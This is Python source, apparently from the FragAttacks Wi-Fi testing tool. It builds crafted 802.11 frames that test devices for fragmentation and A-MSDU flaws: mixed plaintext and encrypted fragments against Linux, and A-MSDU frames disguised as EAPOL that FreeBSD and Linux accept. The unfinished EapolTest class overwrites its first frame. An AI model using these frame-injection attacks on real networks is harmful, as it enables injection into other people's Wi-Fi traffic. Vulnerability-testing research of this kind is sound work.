# Copyright (c) 2020, Mathy Vanhoef <mathy.vanhoef@nyu.edu>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

from fraginternals import *
import copy

class FragInfo:
	def __init__(self, num=0, morefrag=False):
		self.num = num
		self.morefrag = morefrag

class PingTest(Test):
	def __init__(self, ptype, fragments, separate_with=None, opt=None):
		super().__init__(fragments)
		self.ptype = ptype
		self.separate_with = separate_with

		self.bcast_ra = False if opt == None else opt.bcast_ra
		self.bcast_dst = False if opt == None else opt.bcast_dst
		self.as_msdu = False if opt == None else opt.as_msdu
		self.icmp_size = None if opt == None else opt.icmp_size
		self.padding = None if opt == None else opt.padding
		self.to_self = False if opt == None else opt.to_self
		self.bad_mic = False if opt == None else opt.bad_mic
		self.dport = None if opt == None else opt.udp

		self.parse_meta_actions()

	def parse_meta_actions(self):
		relevant_actions = list(filter(lambda act: act.is_meta(Action.MetaDrop) or act.action == Action.Inject,
					       self.actions))

		# All fragments except the last have the MoreFragment flag set (True)
		fraginfos = [FragInfo(fragnum, True) for fragnum in range(len(relevant_actions) - 1)]
		# The last fragment doesn't have the MoreFragment flag set (False)
		fraginfos.append(FragInfo(len(relevant_actions) - 1, False ))

		# Now remove fragment info for the MetaDrop actions
		self.fraginfos = [fraginfo for fraginfo, act in zip(fraginfos, relevant_actions)
				                            if act.action == Action.Inject]

		# Remove all MetaDrop actions
		self.actions = list(filter(lambda act: not act.is_meta(Action.MetaDrop), self.actions))

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, check_fn = generate_request(station, self.ptype, icmp_size=self.icmp_size, \
						padding=self.padding, to_self=self.to_self, dport=self.dport)

		# We can automatically detect the result if the last fragment was sent after a connected event.
		# Note we might get a reply during a rekey handshake, and this will be handled properly.
		if any([act.trigger >= Action.AfterAuth for act in self.actions]):
			self.check_fn = check_fn

		if self.as_msdu == 1:
			# Set the A-MSDU frame type flag in the QoS header
			set_amsdu(header)
			# Encapsulate the request in an A-MSDU payload
			request = create_msdu_subframe(station.mac, station.get_peermac(), request)
		elif self.as_msdu == 2:
			# Set A-MSDU flag but include a normal payload (fake A-MSDU)
			set_amsdu(header)

		# Generate all the individual (fragmented) frames
		num_frags = len(self.get_actions(Action.Inject))
		frames = create_fragments(header, request, num_frags)

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			if self.bcast_ra:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"
			if self.bcast_dst:
				if header.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
					frame.addr3 = "ff:ff:ff:ff:ff:ff"
				else:
					frame.addr1 = "ff:ff:ff:ff:ff:ff"

			# Set fragment number and MoreFragment flags according to parsed MetaDrop rules
			fraginfo = self.fraginfos.pop(0)
			frame.SC = (frame.SC & 0xfff0) | fraginfo.num
			if fraginfo.morefrag:
				frame.FCfield |= Dot11(FCfield="MF").FCfield

			frag.frame = frame

			# Take into account encryption options
			frag.bad_mic = self.bad_mic

		# Put the separator after each fragment if requested.
		if self.separate_with != None:
			for i in range(len(self.actions) - 1, 0, -1):
				# Check if the previous action is indeed an injection
				prev_frag = self.actions[i - 1]
				if prev_frag.action != Action.Inject:
					continue

				# Create a similar inject action for the seperator
				sep_frag = Action(prev_frag.trigger, enc=prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.actions.insert(i, sep_frag)

class ForwardTest(Test):
	def __init__(self, eapol=False, dst=None, large=False):
		if eapol:
			actions = [Action(Action.StartAuth, enc=False)]
		else:
			actions = [Action(Action.Connected, enc=True)]

		if large:
			actions += copy.deepcopy(actions)
			actions += copy.deepcopy(actions)

		super().__init__(actions)
		self.eapol = eapol
		self.dst = dst
		self.large = large
		self.magic = b"forwarded_data"

	def prepare(self, station):
		# Construct the header of the frame
		header = station.get_header(prior=2)
		if header.FCfield & Dot11(FCfield="to-DS").FCfield == 0:
			log(ERROR, "It makes no sense to test whether a client forwards frames??")

		if self.dst == None:
			header.addr3 = station.mac
			self.check_fn = lambda p: self.magic in raw(p)
		else:
			header.addr3 = self.dst

		# Determine the type of data to send
		if self.eapol:
			request = LLC()/SNAP()/EAPOL()/Raw(self.magic)
		else:
			request = LLC()/SNAP()/IP()/Raw(self.magic)

		# Wether to send large requests
		if self.large:
			request = request/Raw(b"A" * 3000)

		# Create the actual frame(s)
		frames = create_fragments(header, request, len(self.actions))
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			frag.frame = frame


class LinuxTest(Test):
	def __init__(self, ptype, decoy_tid=None):
		super().__init__([
			# Note: to inject immediately after 4-way provide IPs using --ip and --peerip
			Action(Action.Connected, Action.GetIp),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=False)
		])
		self.ptype = ptype
		self.decoy_tid = decoy_tid

	def prepare(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.actions[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number. Use a dummy packet
		# that can't accidently aggregate with the first fragment in a corrrect packet.
		p = station.get_header(prior=2)/LLC()/SNAP()/IP()/Raw(b"linux-plain decoy fragment")
		p.SC = frag2.SC ^ (1 << 4)

		# - In the attack against Linux, the decoy frame must have the same QoS TID.
		# - On the other hand, some devices seem to only cache fragments for one sequence
		#   number per QoS priority. So to avoid overwriting the first fragment, add this
		#   option to use a different priority for it.
		p.TID = 2
		if self.decoy_tid != None:
			p.TID = 3

		self.actions[1].frame = p

		# Fragment 3: can now inject last fragment as plaintext
		self.actions[2].frame = frag2


class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Action(Action.BeforeAuth, enc=False),
			Action(Action.BeforeAuth, enc=False)
		])

	def prepare(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[0].frame = frag2


class EapolAmsduTest(Test):
	"""
	TODO: Combine this class with PingTest so we have more advanced argument handling
	"""

	def __init__(self, ptype, actions, freebsd=False, opt=None):
		super().__init__(actions)
		self.ptype = ptype
		self.freebsd = freebsd
		self.bcast_dst = False if opt == None else opt.bcast_dst
		#TODO: More automatically control ptype and its arguments
		self.dport = None if opt == None else opt.udp

		actions = self.get_actions(Action.Inject)
		if len(actions) != 1:
			log(ERROR, f"eapol-amsdu: invalid arguments, should only give 1 inject action (gave {len(actions)}).")
			quit(1)

	def prepare(self, station):
		log(STATUS, "Generating cloacked A-MSDU test", color="green")

		# Generate the single frame
		header, request, check_fn = generate_request(station, self.ptype, dport=self.dport)
		# Set the A-MSDU frame type flag in the QoS header
		set_amsdu(header)

		# We can automatically detect the result if the last fragment was sent after a connected event.
		# Note we might get a reply during a rekey handshake, and this will be handled properly.
		if any([act.trigger >= Action.AfterAuth for act in self.actions]):
			self.check_fn = check_fn

		mac_src = station.mac
		mac_dst = station.get_peermac()
		if self.bcast_dst:
			mac_dst = "ff:ff:ff:ff:ff:ff"

		# Masquerade A-MSDU frame as an EAPOL frame
		if self.freebsd:
			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD/Linux/.. treats as valid")
			request = freebsd_create_eapolmsdu(mac_src, mac_dst, request)
		else:
			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(mac_src, mac_dst, request)

		frames = create_fragments(header, request, 1)
		toinject = frames[0]

		# Make sure addr1/3 matches the destination address in the A-MSDU subframe(s)
		if self.bcast_dst:
			if toinject.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
				toinject.addr3 = "ff:ff:ff:ff:ff:ff"
			else:
				toinject.addr1 = "ff:ff:ff:ff:ff:ff"

		# Note: previously I also sent an Auth to 00:..:55 but that doesn't seem to be needed.
		actions = self.get_actions(Action.Inject)
		actions[0].frame = toinject

